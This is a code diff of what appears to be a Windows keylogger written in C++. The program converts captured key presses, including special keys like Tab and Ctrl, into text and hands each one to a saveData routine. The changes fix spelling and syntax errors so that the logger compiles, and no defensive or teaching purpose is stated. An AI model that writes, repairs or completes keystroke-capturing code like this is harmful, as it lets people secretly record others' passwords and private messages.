@@ -1,5 +1,6 @@
 #include <iostream>
 #include <fstream>
+#include <string>
 #include <windows.h>
 #include <bits/stdc++.h>
 
@@ -16,7 +17,7 @@ void saveData(std::string data){
 
 //Translate special characters. Only works for Windows now
 std::string translateKey(int key){
-	std::string result;
+	std::string result = "";
 
 	switch (key) {
 	case VK_SPACE:
@@ -37,7 +38,7 @@ std::string translateKey(int key){
 	case VK_TAB:
 		result = "\t";
 		break;
-	case VK_CONTOL:
+	case VK_CONTROL:
 		result = "[CTRL]";
 		break;
 	case VK_MENU:
@@ -68,9 +69,9 @@ int main (void){
 				isSpecial = std::find(std::begin(specialKeys), std::end(specialKeys), key) != std::end(specialKeys);
 				//Special key
 				if (isSpecial){
-					specialChar = translateKey(key)
+					specialChar = translateKey(key);
 
-					saveData(specialChar)
+					saveData(specialChar);
 				}
 				//Normal key
 				else {
